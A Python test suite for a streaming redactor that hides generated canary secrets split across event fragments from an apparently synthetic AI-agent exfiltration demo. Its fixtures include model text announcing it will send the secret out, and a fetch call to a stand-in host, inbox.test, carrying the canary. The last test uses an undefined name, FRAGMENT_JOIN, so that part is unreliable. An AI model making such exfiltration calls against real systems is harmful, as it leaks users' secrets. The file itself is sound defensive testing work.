"""The split canary is redacted wherever the fragment boundaries fall (K4).

Owner: ATACE Working Group.

Every canary here is generated per test with `secrets`, so no canary-shaped
literal enters a tracked file and nothing derived from one is printed. Each
split test first asserts the canary is present in the unredacted join, because
a scan that found nothing would otherwise report a pass.

The base measurement this suite closes: a 44-character canary split across two
`model_delta` fragments was redacted at 0 of 43 split points and the
reassembled text carried it in clear at all 43.
"""
from __future__ import annotations

import hashlib
import json
import secrets

import pytest

from contracts import checks
from cxbom import canary as k
from cxbom import proxy

# The shape J2 spec 6 fixes: `lab-demo-` and 32 hexadecimal characters. A
# literal rather than k.SHAPE_PREFIX, so a change to one without the other fails.
PREFIX = "lab-demo-"
SPLITS = len(PREFIX) + 32 - 1  # interior split points of one canary


def new_canary() -> tuple[str, frozenset, tuple]:
    """A canary and its key material, both through the shipped entry points.

    `make_canary` and `key_material` rather than a second spelling of the shape,
    so the suite exercises the generator and the intake a take will use. The
    tests that need a canary the shipped generator refuses build it themselves
    and say why: `overlapping_canary` below is the only one.
    """
    value = k.make_canary()
    hashes, lengths = k.key_material(value)
    assert hashes == frozenset({hashlib.sha256(value.encode("utf-8")).hexdigest()})
    assert lengths == (len(value),)
    return value, hashes, lengths


def run(fragments, hashes, lengths, window=k.DEFAULT_WINDOW_CHARS) -> str:
    """The redacted stream, reassembled, for one list of fragments."""
    r = k.SplitCanaryRedactor(hashes, lengths, window_chars=window)
    out = [r.feed(f) for f in fragments]
    out.append(r.finish())
    assert r.held_chars == 0, "finish() left text in the window"
    return "".join(out)


def event(seq: int, type_: str, data: dict) -> dict:
    return {"v": 1, "seq": seq, "t": float(seq) / 10, "run": "k4-split-canary",
            "type": type_, "data": data, "prev_sha256": None}


def chained(events: list[dict]) -> str:
    """The events as the collector would write them, with the prev_sha256 chain."""
    lines: list[str] = []
    for i, ev in enumerate(events):
        ev = dict(ev)
        ev["prev_sha256"] = None if i == 0 else hashlib.sha256(
            lines[-1].encode("utf-8")).hexdigest()
        lines.append(json.dumps(ev, separators=(",", ":"), sort_keys=False))
    return "".join(line + "\n" for line in lines)


# --- the premise, checked rather than assumed -------------------------------

def test_the_defect_this_module_closes_is_still_real():
    """`cxbom.proxy.redact` leaks the split canary. If it stopped, this suite's premise moved.

    Not a duplicate of the spec's own re-measurement: that test guards a
    paragraph, this one guards the reason this module exists.
    """
    value, hashes, _ = new_canary()
    assert len(value) == SPLITS + 1
    assert proxy.redact(value, hashes) == proxy.CANARY
    cut = len(value) // 2
    head, tail = proxy.redact(value[:cut], hashes), proxy.redact(value[cut:], hashes)
    assert head != proxy.CANARY and tail != proxy.CANARY
    assert value in head + tail, "the split canary no longer leaks through proxy.redact"


def test_the_placeholder_is_the_one_the_proxy_writes():
    """One stream must not carry two spellings of a redaction."""
    assert k.CANARY == proxy.CANARY


# --- every split point ------------------------------------------------------

@pytest.mark.parametrize("window", [k.DEFAULT_WINDOW_CHARS, 2 * (SPLITS + 1)])
def test_every_split_point_is_redacted(window):
    """All 43 split points of the base measurement, plus the two boundary cuts.

    Run twice: once with the default window, where nothing is released before
    finish(), and once with the smallest window a 44-character canary allows,
    where the window flushes on every character and every split coincides with
    a release boundary.
    """
    value, hashes, lengths = new_canary()
    n = len(value)
    redacted = 0
    for cut in range(1, n):
        fragments = ["prefix text ", value[:cut], value[cut:], " suffix text"]
        assert value in "".join(fragments), "the split canary is not in the input"
        out = run(fragments, hashes, lengths, window)
        assert value not in out, f"the canary survived a split at {cut} of {n - 1}"
        assert k.CANARY in out, f"no redaction happened at split {cut} of {n - 1}"
        assert out == f"prefix text {k.CANARY} suffix text"
        redacted += 1
    assert redacted == n - 1 == SPLITS, f"{redacted} split points covered, expected {SPLITS}"


def test_a_split_after_the_first_byte_and_before_the_last():
    """The two extremes named separately, because an off-by-one hides at the ends."""
    value, hashes, lengths = new_canary()
    for fragments in ([value[:1], value[1:]], [value[:-1], value[-1:]]):
        assert value in "".join(fragments)
        out = run(fragments, hashes, lengths)
        assert out == k.CANARY


def test_one_canary_broken_across_three_fragments():
    value, hashes, lengths = new_canary()
    third = len(value) // 3
    fragments = ["a ", value[:third], value[third:2 * third], value[2 * third:], " b"]
    assert value in "".join(fragments)
    assert run(fragments, hashes, lengths) == f"a {k.CANARY} b"


def test_one_canary_broken_one_character_at_a_time():
    """The worst case: as many fragments as the canary has characters."""
    value, hashes, lengths = new_canary()
    fragments = ["head "] + list(value) + [" tail"]
    assert value in "".join(fragments)
    assert run(fragments, hashes, lengths) == f"head {k.CANARY} tail"


def test_a_split_coinciding_with_a_window_flush():
    """The canary straddles a release, which is the case a naive window misses.

    The window is sized so it flushes many times before the canary starts, and
    the fragments are sized so a release boundary lands inside the canary. The
    redactor holds the match back rather than publishing its first half.
    """
    value, hashes, lengths = new_canary()
    n = len(value)
    window = 4 * n  # comfortably above 2n, so releases happen mid-stream
    filler = "x" * (3 * n)
    for cut in (1, n // 2, n - 1):
        r = k.SplitCanaryRedactor(hashes, lengths, window_chars=window)
        out = [r.feed(filler), r.feed(value[:cut]), r.feed(value[cut:]), r.feed(filler)]
        assert sum(len(p) for p in out) > 0, "nothing was released before finish()"
        out.append(r.finish())
        joined = "".join(out)
        assert value not in joined, f"a canary straddling a flush survived at cut {cut}"
        assert joined == filler + k.CANARY + filler


def test_a_canary_longer_than_one_window_is_refused_not_scanned():
    """The bounded path refuses. It does not scan with a window too small to hold it."""
    value, hashes, lengths = new_canary()
    with pytest.raises(k.CanaryWindowError) as e:
        k.SplitCanaryRedactor(hashes, lengths, window_chars=len(value))
    assert "half the window" in str(e.value)
    assert value not in str(e.value) and PREFIX not in str(e.value)
    # One character above twice the length is accepted and still redacts.
    assert run([value], hashes, lengths, 2 * len(value)) == k.CANARY


def test_the_window_bound_holds_while_a_fragment_far_larger_than_it_is_scanned():
    """A huge fragment is scanned whole, in passes, and never buffered past the bound."""
    value, hashes, lengths = new_canary()
    window = 4 * len(value)
    r = k.SplitCanaryRedactor(hashes, lengths, window_chars=window)
    big = "y" * (50 * window)
    cut = len(value) // 2
    out = [r.feed(big + value[:cut])]
    assert r.held_chars <= window, f"the window held {r.held_chars}, bound is {window}"
    out.append(r.feed(value[cut:] + big))
    assert r.held_chars <= window
    out.append(r.finish())
    joined = "".join(out)
    assert value not in joined
    assert joined == big + k.CANARY + big


def test_a_canary_embedded_in_a_longer_run_of_token_characters():
    """Offset scanning catches this, and so does the proxy since it keys on the shape's prefix.

    The proxy's maximal-run guess used to miss it. tests/test_canary_glued.py
    carries every glued form through every path.
    """
    value, hashes, lengths = new_canary()
    glued = f"AAA{value}ZZZ"
    assert proxy.redact(glued, hashes) == proxy.CANARY
    assert run([glued], hashes, lengths) == f"AAA{k.CANARY}ZZZ"
    assert k.redact_value(glued, hashes, lengths) == k.CANARY


def test_a_stream_with_no_canary_comes_back_unchanged():
    """Fidelity: the redactor is the identity on text that carries no canary."""
    _, hashes, lengths = new_canary()
    fragments = [secrets.token_hex(7) + " " for _ in range(40)]
    assert run(fragments, hashes, lengths) == "".join(fragments)


def test_no_key_material_refuses_rather_than_passing_the_stream_through():
    """The relay half used to return the stream verbatim and silently. Measured, then fixed.

    A take started without a canary hash would have streamed the canary to the
    pane with no error anywhere, while only the publish check refused. The
    artifact was safe because publishing fails closed; the pane a viewer watches
    was not. Every entry point now refuses.
    """
    value, hashes, lengths = new_canary()
    for call in (lambda: k.SplitCanaryRedactor(frozenset(), ()),
                 lambda: k.redact_value({"a": value}, frozenset(), ()),
                 lambda: k.redact_events(split_stream(value, 9), frozenset(), ())):
        with pytest.raises(k.CanaryWindowError) as e:
            call()
        assert "no canary hash" in str(e.value)
    # The publish check reports rather than raises, and says the same thing.
    assert any("no canary hash" in e
               for e in k.publish_errors(split_stream(value, 9), frozenset(), ()))


# --- refusals, each one a path that would otherwise fail open ---------------

def test_hashes_without_a_length_are_refused():
    _, hashes, _ = new_canary()
    with pytest.raises(k.CanaryWindowError) as e:
        k.SplitCanaryRedactor(hashes, ())
    assert "no canary length" in str(e.value)


def test_feed_after_finish_is_refused():
    value, hashes, lengths = new_canary()
    r = k.SplitCanaryRedactor(hashes, lengths)
    r.feed(value[:5])
    r.finish()
    with pytest.raises(k.CanaryWindowError) as e:
        r.feed(value[5:])
    assert "after finish" in str(e.value)


def test_text_that_will_not_encode_is_refused_not_skipped():
    """A lone surrogate cannot be hashed. Skipping it would turn redaction off."""
    _, hashes, lengths = new_canary()
    r = k.SplitCanaryRedactor(hashes, lengths)
    with pytest.raises(k.CanaryWindowError) as e:
        r.feed("\ud800")
    assert "UTF-8" in str(e.value)


def test_a_hash_that_is_not_a_sha256_is_refused():
    with pytest.raises(k.CanaryWindowError):
        k.SplitCanaryRedactor(frozenset({"not-a-hash"}), (44,))
    with pytest.raises(k.CanaryWindowError):
        k.SplitCanaryRedactor(frozenset({"AB" * 32}), (44,))  # uppercase never matches


def test_a_non_positive_length_is_refused():
    _, hashes, _ = new_canary()
    for bad in (0, -1, 44.0, True):
        with pytest.raises(k.CanaryWindowError):
            k.SplitCanaryRedactor(hashes, (bad,))


# --- model_delta is in scope ------------------------------------------------

def split_stream(value: str, cut: int) -> list[dict]:
    """A C2 stream whose model output carries the canary across two fragments."""
    return [
        event(0, "run_started", {"scenario": "rug-pull", "gate": "enforce",
                                 "model": {"id": "example/model", "revision": "0" * 40},
                                 "synthetic": True, "demonstration": True}),
        event(1, "model_delta", {"text": "I will send the secret "}),
        event(2, "model_delta", {"text": value[:cut]}),
        event(3, "model_delta", {"text": value[cut:] + " to the inbox."}),
        event(4, "exfil_attempt", {"tool": "fetch", "url": f"http://inbox.test/?q={value}",
                                   "canaryPresent": True}),
        event(5, "tool_call", {"tool": "fetch", "arguments": {"url": f"http://inbox.test/?q={value}"}}),
        event(6, "run_finished", {"outcome": "exfiltrated"}),
    ]


def test_model_delta_is_in_the_redactors_scope():
    """The exhibit: a split canary in a real C2 stream, before and after.

    The redacted stream is then chained and run through the contract's own
    checker, so the fix cannot be "it redacts but the stream no longer validates".
    """
    value, hashes, lengths = new_canary()
    events = split_stream(value, len(value) // 2)
    before = "".join(ev["data"].get("text", "") for ev in events if ev["type"] == "model_delta")
    assert value in before, "the canary is not in the unredacted model output"
    assert k.publish_errors(events, hashes, lengths), "the publish check missed the split canary"

    out = k.redact_events(events, hashes, lengths)
    after = "".join(ev["data"].get("text", "") for ev in out if ev["type"] == "model_delta")
    assert value not in after
    assert after == f"I will send the secret {k.CANARY} to the inbox."
    assert len(out) == len(events), "redaction changed the event count"
    assert [ev["seq"] for ev in out] == [ev["seq"] for ev in events]
    assert not k.publish_errors(out, hashes, lengths)
    assert events[2]["data"]["text"] == value[: len(value) // 2], "the input was mutated"
    assert not checks.check_events_text(chained(out)), "the redacted stream is not a valid C2 stream"


def test_model_delta_is_in_scope_at_every_split_point():
    value, hashes, lengths = new_canary()
    for cut in range(1, len(value)):
        out = k.redact_events(split_stream(value, cut), hashes, lengths)
        after = "".join(ev["data"].get("text", "") for ev in out if ev["type"] == "model_delta")
        assert value not in after, f"event-level split at {cut} survived"
        assert after == f"I will send the secret {k.CANARY} to the inbox."


def test_the_other_two_carriers_k4_names_are_in_scope():
    """`tool_call.arguments` and `exfil_attempt.url`, each a single value."""
    value, hashes, lengths = new_canary()
    out = k.redact_events(split_stream(value, 7), hashes, lengths)
    assert out[4]["data"]["url"] == k.CANARY
    assert out[5]["data"]["arguments"]["url"] == k.CANARY
    assert out[4]["data"]["canaryPresent"] is True, "canaryPresent is the signal and stays"


def test_redaction_is_refused_on_a_stream_that_is_already_chained():
    """Rewriting a chained line breaks every hash after it."""
    value, hashes, lengths = new_canary()
    events = split_stream(value, 5)
    events[3]["prev_sha256"] = "0" * 64
    with pytest.raises(k.CanaryWindowError) as e:
        k.redact_events(events, hashes, lengths)
    assert "prev_sha256" in str(e.value)


def test_model_delta_out_of_stream_order_is_refused():
    """Reassembly follows list order, so a list out of order would be joined wrong."""
    value, hashes, lengths = new_canary()
    events = split_stream(value, 5)
    events[2], events[3] = events[3], events[2]
    with pytest.raises(k.CanaryWindowError) as e:
        k.redact_events(events, hashes, lengths)
    assert "increasing seq order" in str(e.value)
    assert k.publish_errors(events, hashes, lengths), "the check reported a pass on a reordered stream"


# --- the hash-keyed publish check ------------------------------------------

def test_the_publish_check_finds_what_a_per_record_scan_cannot():
    """A record-by-record substring scan misses the split. Reassembly does not.

    This is the backstop section 10.1 requires, and the reason it is keyed on
    the reassembled output rather than on each line.
    """
    value, hashes, lengths = new_canary()
    for cut in range(1, len(value)):
        # Only the split carriers, so the claim under test is the split and not
        # the whole canary a per-record scan would have found in exfil_attempt.
        events = [ev for ev in split_stream(value, cut)
                  if ev["type"] not in ("exfil_attempt", "tool_call")]
        lines = chained(events)
        assert value not in lines, f"split {cut} left the canary inside one record"
        errs = k.publish_errors(events, hashes, lengths)
        assert any("reassembled" in e for e in errs), f"split {cut} passed the publish check"
        assert all(value not in e and PREFIX not in e for e in errs)


def test_the_publish_check_names_the_events_a_canary_spans():
    value, hashes, lengths = new_canary()
    errs = k.publish_errors(split_stream(value, len(value) // 2), hashes, lengths)
    spanning = [e for e in errs if "reassembled" in e]
    assert len(spanning) == 1, errs
    assert "[2, 3]" in spanning[0], spanning[0]


def test_the_publish_check_passes_a_stream_with_no_canary():
    value, hashes, lengths = new_canary()
    clean = k.redact_events(split_stream(value, 11), hashes, lengths)
    assert k.publish_errors(clean, hashes, lengths) == []


def test_the_publish_check_refuses_to_report_a_pass_without_key_material():
    """A check with no key that returns clean is the fail-open shape itself."""
    value, hashes, lengths = new_canary()
    events = split_stream(value, 9)
    assert any("no canary hash" in e for e in k.publish_errors(events, frozenset(), ()))
    assert any("no canary length" in e for e in k.publish_errors(events, hashes, ()))
    assert k.publish_errors(events, hashes, lengths), "the positive control found nothing"


def test_the_publish_check_reports_unencodable_text_rather_than_skipping_it():
    value, hashes, lengths = new_canary()
    events = split_stream(value, 9)
    events[1]["data"]["text"] = "\ud800"
    assert any("UTF-8" in e for e in k.publish_errors(events, hashes, lengths))


def test_the_publish_check_reads_every_string_including_keys():
    value, hashes, lengths = new_canary()
    events = split_stream(value, 9)
    events[6]["data"] = {"outcome": "exfiltrated", value: "x"}
    errs = k.publish_errors(events, hashes, lengths)
    assert any("(key)" in e for e in errs), errs


# --- overlapping and nested canaries ---------------------------------------

def nested_pair() -> tuple[str, str, frozenset, tuple]:
    """An outer canary and an inner one that sits inside it, with both keys."""
    outer = PREFIX + secrets.token_hex(16)
    inner = outer[6:26]
    hashes = frozenset({hashlib.sha256(s.encode("utf-8")).hexdigest() for s in (outer, inner)})
    return outer, inner, hashes, (len(inner), len(outer))


def test_a_canary_nested_inside_another_leaves_neither_in_clear():
    """Nested matches sort as (5, 15) then (6, 10), so the spans must be merged.

    Found by mutation: an unmerged rewrite jumps its cursor forward to the inner
    match's end and then back to the outer one's, and re-emits the outer
    canary's tail in clear. The exact-output assertion is what holds it.

    The suffix scan runs over the published text with the placeholder removed, and
    the surrounding text is `xx` and `yy` rather than `a` and `b`. Both halves of
    that matter, and the first version of this test had neither: it scanned the
    whole output, down to a one-character suffix, while the output carried the
    literal `a <canary> b`. The letters a, b and c are hexadecimal digits, so any
    canary ending in one of them failed a correct redaction -- three shapes in
    sixteen, and the suite failed a quarter of its runs. x and y cannot appear in a
    canary of this shape, so the scaffolding cannot collide with a suffix, and
    stripping the placeholder removes the only other fixed text in the output.
    A randomly seeded test that fails sometimes teaches its reader to re-run until
    green, which is how a real failure gets waved through.
    """
    outer, inner, hashes, lengths = nested_pair()
    assert inner in outer and inner != outer
    for fragments in ([f"xx{outer}yy"], [f"xx{outer[:9]}", f"{outer[9:]}yy"],
                      ["xx"] + list(outer) + ["yy"]):
        out = run(fragments, hashes, lengths)
        assert out == f"xx{k.CANARY}yy", out
        assert outer not in out and inner not in out
        published = out.replace(k.CANARY, "")
        assert published == "xxyy", published
        for tail in range(1, len(outer)):
            assert outer[tail:] not in published, f"a suffix of the outer canary survived: {tail}"


def test_two_canaries_that_overlap_without_nesting():
    value = PREFIX + secrets.token_hex(16)
    stream = f"xx{value}yy"
    second = stream[len(PREFIX):len(PREFIX) + 24]  # overlaps the first canary's tail
    hashes = frozenset({hashlib.sha256(s.encode("utf-8")).hexdigest() for s in (value, second)})
    lengths = (len(second), len(value))
    out = run([stream], hashes, lengths)
    assert value not in out and second not in out
    assert out == f"xx{k.CANARY}yy", out


# --- the field boundary, which is a boundary like any other ----------------

def test_a_canary_split_across_two_tool_arguments():
    """Instance N+1 of this module's own fix, found by hunting it and closed here.

    The model controls its own tool arguments, so it can put half the canary in
    one and half in the next. A per-value scan misses that for exactly the
    reason a per-fragment scan missed the split fragment.
    """
    value, hashes, lengths = new_canary()
    for cut in range(1, len(value)):
        args = {"host": f"inbox.test/?a={value[:cut]}", "path": f"{value[cut:]}/send"}
        assert value not in args["host"] and value not in args["path"]
        out = k.redact_value(args, hashes, lengths)
        assert out["host"] == k.CANARY and out["path"] == k.CANARY, (cut, out)
        assert value not in "".join(out.values())


def test_the_publish_check_joins_the_whole_stream_not_only_the_model_output():
    value, hashes, lengths = new_canary()
    cut = len(value) // 2
    events = [
        event(0, "tool_call", {"tool": "fetch",
                               "arguments": {"a": value[:cut], "b": value[cut:]}}),
        event(1, "run_finished", {"outcome": "exfiltrated"}),
    ]
    lines = chained(events)
    assert value not in lines, "the canary sits whole inside one record, so this proves nothing"
    errs = k.publish_errors(events, hashes, lengths)
    assert errs, "a canary split across two tool arguments passed the publish check"
    assert all(value not in e and PREFIX not in e for e in errs)
    assert not k.publish_errors(k.redact_events(events, hashes, lengths), hashes, lengths)


def test_a_field_split_across_two_events_is_caught_at_the_last_gate():
    """Adjacent in document order: the last value of one event, the first of the next.

    The join is over values in document order, so this is the split it closes.
    The limit is stated in the module docstring and is not closed here: two
    halves the reader never sees adjacent are not reassembled by any join.
    """
    value, hashes, lengths = new_canary()
    cut = len(value) // 2
    events = [event(0, "beat", {"id": "b", "title": "t", "caption": "so far " + value[:cut],
                                "minHoldSeconds": 1.0}),
              event(1, "beat", {"id": value[cut:], "title": "t2", "caption": "x",
                                "minHoldSeconds": 1.0})]
    assert value not in chained(events)
    errs = k.publish_errors(events, hashes, lengths)
    assert any("joined in document order" in e for e in errs), errs


# --- the window bound, and the reachability of its guard --------------------

def test_the_window_bound_is_never_exceeded_over_an_exhaustive_sweep():
    """The memory bound holds for every fragmentation, so its guard cannot fire.

    Exhaustive over every composition of a stream into fragments, for the
    smallest windows a canary of each length allows, with the canary at every
    offset. This is the exhibit that `_check_window` is unreachable: it is why
    mutating that raise into a truncation is indistinguishable rather than a
    hole, and it fails the day an edit to the admission budget makes it
    reachable.
    """
    worst = 0
    cases = 0
    for size in (3, 4, 5):
        value = secrets.token_hex(size)[:size]
        hashes = frozenset({hashlib.sha256(value.encode("utf-8")).hexdigest()})
        for window in (2 * size, 2 * size + 1, 3 * size):
            for offset in range(0, size + 2):
                stream = "z" * offset + value + "z" * (size + 1)
                n = len(stream)
                for mask in range(1 << (n - 1)):
                    cuts = [i + 1 for i in range(n - 1) if mask >> i & 1]
                    bounds = [0, *cuts, n]
                    fragments = [stream[a:b] for a, b in zip(bounds, bounds[1:])]
                    r = k.SplitCanaryRedactor(hashes, (size,), window_chars=window)
                    out = []
                    for f in fragments:
                        out.append(r.feed(f))
                        assert r.held_chars <= window, (size, window, offset, r.held_chars)
                        worst = max(worst, r.held_chars)
                    out.append(r.finish())
                    joined = "".join(out)
                    assert value not in joined, (size, window, offset, fragments)
                    assert joined == stream.replace(value, k.CANARY)
                    cases += 1
    assert cases > 20000, f"the sweep covered only {cases} cases"
    assert worst > 0, "nothing was ever held, so the bound was never exercised"


# --- a run of canaries, which is where the bound was actually reachable -----

def feed_all(text, hashes, lengths, window=k.DEFAULT_WINDOW_CHARS, fragment=64):
    """The redacted stream and the peak characters held, fed in fixed-size fragments."""
    r = k.SplitCanaryRedactor(hashes, lengths, window_chars=window)
    out = []
    peak = 0
    for at in range(0, len(text), fragment):
        out.append(r.feed(text[at:at + fragment]))
        peak = max(peak, r.held_chars)
    out.append(r.finish())
    return "".join(out), peak


def test_back_to_back_canaries_drain_rather_than_filling_the_window():
    """The input the 4.77-million-case sweep could not produce, because of its premise.

    The sweep put one canary in a stream and cut the stream every way, so two
    complete adjacent occurrences never appeared. `_merge` merged touching spans,
    so a run of them was one span of unbounded length, `_drain` pinned release to
    its start, and the buffer never drained: 187 consecutive canaries refused at
    the shipped default window. What is held now does not grow with the run.
    """
    value, hashes, lengths = new_canary()
    _, short = feed_all(value * 50, hashes, lengths)
    out, peak = feed_all(value * 200, hashes, lengths)
    assert value not in out
    assert out == k.CANARY * 200, "a run of canaries is not a run of placeholders"
    assert peak == short, f"the window held {peak} for 200 canaries and {short} for 50"
    assert peak <= 2 * len(value), f"the window held {peak} for a run of canaries"


def test_each_occurrence_renders_as_its_own_placeholder():
    """A fidelity claim: the redacted stream shows how many times the model reached.

    Under the touching merge, one, two and three consecutive canaries all rendered
    as a single placeholder, so the count was lost.
    """
    value, hashes, lengths = new_canary()
    for n in (1, 2, 3, 7):
        out, _ = feed_all(f"a {value * n} b", hashes, lengths)
        assert out == f"a {k.CANARY * n} b", (n, out)


def overlapping_canary() -> tuple[str, frozenset, tuple]:
    """A value whose last character is its own first, so occurrences can overlap by one.

    No value of the published shape can be one: the prefix opens on a character
    that appears nowhere else in a canary (see `k.SHAPE_PREFIX`). So this is the
    input that still reaches the window guard, an operator-supplied value keyed
    by its SHA-256 the way `--redact-sha256` keys one, without passing
    `key_material`. It is all hexadecimal, so it is not the shape either and the
    shape rule never sees it.
    """
    first = secrets.choice(k.SHAPE_HEX)
    value = first + secrets.token_hex(k.SHAPE_LEN)[:k.SHAPE_LEN - 2] + first
    assert len(value) == k.SHAPE_LEN and not k._shape_whole(value)
    return value, frozenset({hashlib.sha256(value.encode("utf-8")).hexdigest()}), (len(value),)


def test_a_run_of_overlapping_canaries_is_refused_rather_than_released_in_part():
    """The window guard is reachable, and this is the exhibit that says so.

    Not a theorem being asserted: a chain of occurrences that overlap by one
    character merges into one span whatever `_merge` does about touching spans, and
    the run is held back whole because releasing at a merged span's end publishes
    the next occurrence minus the character already inside a placeholder --
    measured, that publishes the canary. So the buffer grows on this input and the
    guard refuses. Deleting the guard turns a documented memory bound into no
    bound, and deleting the hold-back leaks. Both die here.
    """
    value, hashes, lengths = overlapping_canary()
    chain = value + value[1:] * 400
    assert chain.count(value) > 100, "the chain does not repeat the canary"
    with pytest.raises(k.CanaryWindowError) as e:
        feed_all(chain, hashes, lengths)
    assert "above its bound" in str(e.value)
    assert all(value[i:i + 8] not in str(e.value) for i in range(len(value) - 7))
    # It fails closed, and the publish check catches the same stream independently.
    events = [event(0, "model_delta", {"text": chain})]
    assert k.publish_errors(events, hashes, lengths)
    # And the value that builds it is not the shape, so the intake refuses it.
    with pytest.raises(k.CanaryWindowError) as e:
        k.key_material(value)
    assert f"{k.SHAPE_LEN} characters" in str(e.value)


# --- the prefix, which is where the chain is closed ------------------------
# A run of occurrences that overlap is the only input that fills the window. The
# prefix opens on a character outside the hexadecimal alphabet that appears
# nowhere else in the prefix, so no occurrence of a value of the shape can start
# inside another. The draw loop and the intake refusal that the earlier prefix
# needed are gone, and so are the tests that fed them a bordered value of the
# shape: there is no such value to feed.


def borders_by_definition(s: str) -> list[int]:
    """Every proper border of s, straight from the definition. Quadratic and obvious."""
    return [n for n in range(1, len(s)) if s[:n] == s[len(s) - n:]]


def overlap_shifts(prefix: str) -> list[int]:
    """Every shift at which two values of `prefix` plus 32 hex digits can overlap.

    Position p of a value is the literal prefix[p] below len(prefix) and any
    hexadecimal digit from there on. A shift s is possible when every position
    the two occurrences share admits a common character. That covers one canary
    against itself, which is a border of length SHAPE_LEN - s, and two different
    canaries, in one pass.
    """
    m = len(prefix) + k.SHAPE_HEX_CHARS

    def admits(p: int) -> set:
        return {prefix[p]} if p < len(prefix) else set(k.SHAPE_HEX)

    return [shift for shift in range(1, m)
            if all(admits(shift + t) & admits(t) for t in range(m - shift))]


def test_the_prefix_opens_on_a_character_no_other_position_of_a_canary_holds():
    """The premise the proof above `k.SHAPE_PREFIX` uses, pinned on the constants.

    The shift check below is the complete one. This names the two facts the
    written proof relies on, so an edit that breaks the proof fails here and
    says which fact went.
    """
    assert k.SHAPE_PREFIX == PREFIX, "the shipped prefix and this suite disagree"
    assert k.SHAPE_PREFIX[0] not in k.SHAPE_HEX, "the prefix opens on a hexadecimal digit"
    assert k.SHAPE_PREFIX[0] not in k.SHAPE_PREFIX[1:], "the prefix repeats its first character"


def test_no_two_values_of_the_shape_can_overlap_at_any_shift():
    """Checked at every shift against the shape, not argued in prose.

    The negative control is what keeps this from passing vacuously. Open the
    same prefix on two hexadecimal digits, as the earlier prefix did, and the
    checker finds the two overlaps that were its borders of length 1 and 2: a
    tail ending on the first digit, and a tail ending on both.
    """
    assert overlap_shifts(k.SHAPE_PREFIX) == []
    hex_first = "de" + k.SHAPE_PREFIX[2:]
    shifts = overlap_shifts(hex_first)
    assert k.SHAPE_LEN - 1 in shifts and k.SHAPE_LEN - 2 in shifts, shifts


def test_a_generated_canary_has_the_shape_and_no_border():
    """Every draw is the published shape, and none of them can chain."""
    values = {k.make_canary() for _ in range(400)}
    assert len(values) == 400, "the generator repeated a value"
    for value in values:
        assert len(value) == k.SHAPE_LEN == SPLITS + 1
        assert value.startswith(PREFIX)
        assert all(c in k.SHAPE_HEX for c in value[len(PREFIX):])
        assert borders_by_definition(value) == []


def test_the_generator_draws_once(monkeypatch):
    """One draw of the randomness source per canary, and the value is that draw."""
    calls = []

    def fake(n):
        calls.append(n)
        return "0" * 31 + "d"   # a tail that made a border under the earlier prefix

    monkeypatch.setattr(k.secrets, "token_hex", fake)
    value = k.make_canary()
    assert calls == [k.SHAPE_HEX_CHARS // 2], calls
    assert value == PREFIX + "0" * 31 + "d"
    assert borders_by_definition(value) == []


def test_every_value_of_the_shape_passes_the_intake_even_one_built_to_border():
    """The intake refuses only what is not the shape, because nothing else needs it.

    The tails here are the ones most able to form a border: every constant tail,
    and every tail ending on each one- and two-digit hexadecimal suffix. None has
    a border and the intake keys every one.
    """
    tails = [c * 32 for c in k.SHAPE_HEX]
    tails += ["0" * 30 + a + b for a in k.SHAPE_HEX for b in k.SHAPE_HEX]
    for tail in tails:
        value = PREFIX + tail
        assert borders_by_definition(value) == [], tail
        hashes, lengths = k.key_material(value)
        assert hashes == frozenset({hashlib.sha256(value.encode("utf-8")).hexdigest()})
        assert lengths == (k.SHAPE_LEN,)


# None of these is the shape, and none of them contains a 44-character window
# that is: this file commits no canary-shaped literal, which is what the module
# docstring above and section 6 of the spec both require.
@pytest.mark.parametrize("bad", [
    "",
    PREFIX,
    PREFIX + "0" * 31,                    # one digit short
    PREFIX + "0" * 31 + "-0",             # two characters long, and one is not hex
    PREFIX + "0" * 31 + "g",              # outside the hexadecimal alphabet
    PREFIX + "0" * 31 + "A",              # uppercase is not the published shape
    PREFIX.upper() + "0" * 32,            # the prefix is literal
    "\n" + PREFIX + "0" * 31,             # leading whitespace, so not the shape
])
def test_the_intake_refuses_a_value_that_is_not_the_published_shape(bad):
    with pytest.raises(k.CanaryWindowError) as e:
        k.key_material(bad)
    assert f"{k.SHAPE_LEN} characters" in str(e.value)
    assert not k._shape_whole(bad), "this case committed a canary-shaped literal"


def test_the_intake_refuses_a_value_whose_first_characters_are_the_shape_but_run_on():
    """The length check on its own. Every case above also fails the character check.

    Built at run time, because the first SHAPE_LEN characters are canary-shaped
    and this file commits no such literal.
    """
    value = k.make_canary()
    for longer in (value + "0", value + value[-1], value + "x"):
        with pytest.raises(k.CanaryWindowError) as e:
            k.key_material(longer)
        assert f"{k.SHAPE_LEN} characters" in str(e.value)


@pytest.mark.parametrize("bad", [None, k.SHAPE_LEN, PREFIX.encode("utf-8"), ["x"]])
def test_the_intake_refuses_a_canary_that_is_not_a_string(bad):
    with pytest.raises(k.CanaryWindowError) as e:
        k.key_material(bad)
    assert "is a str" in str(e.value)


def test_the_intake_returns_the_key_material_the_redactor_takes():
    """Round trip: the pair the intake returns is the pair every entry point wants."""
    value = k.make_canary()
    hashes, lengths = k.key_material(value)
    assert hashes == frozenset({hashlib.sha256(value.encode("utf-8")).hexdigest()})
    assert lengths == (len(value),)
    assert run([f"xx{value}yy"], hashes, lengths) == f"xx{k.CANARY}yy"
    assert not k.publish_errors(
        [event(0, "model_delta", {"text": f"xx{k.CANARY}yy"})], hashes, lengths)


def test_the_chain_that_filled_the_window_cannot_be_built_from_a_generated_canary():
    """The exhibit for the fix: the same construction, a canary the generator made.

    `overlapping_canary` plus this chain, fed in 64-character fragments, refuses
    at 8256 characters against a bound of 8192 -- the test above pins that. The
    construction is unchanged here and only the canary is, and the stream goes
    through whole with the one occurrence it actually contains redacted.
    """
    bad, bad_hashes, bad_lengths = overlapping_canary()
    with pytest.raises(k.CanaryWindowError) as e:
        feed_all(bad + bad[1:] * 400, bad_hashes, bad_lengths)
    assert "above its bound" in str(e.value)

    value, hashes, lengths = new_canary()
    chain = value + value[1:] * 400
    assert chain.count(value) == 1, "a borderless canary chained, which cannot happen"
    out, peak = feed_all(chain, hashes, lengths)
    assert out.count(k.CANARY) == 1
    assert value not in out
    assert out == chain.replace(value, k.CANARY)
    assert peak <= 2 * len(value), f"the window held {peak} for the same construction"
    # The rolling window redacts the one whole canary, and what it leaves is the
    # canary with its first character dropped, 400 times: all 32 secret digits.
    # This assertion used to say the gate passed that. The fragment join supplies
    # the public head of the prefix, so the gate now refuses it.
    errs = k.publish_errors([event(0, "model_delta", {"text": out})], hashes, lengths)
    assert errs and all(FRAGMENT_JOIN in e for e in errs), errs


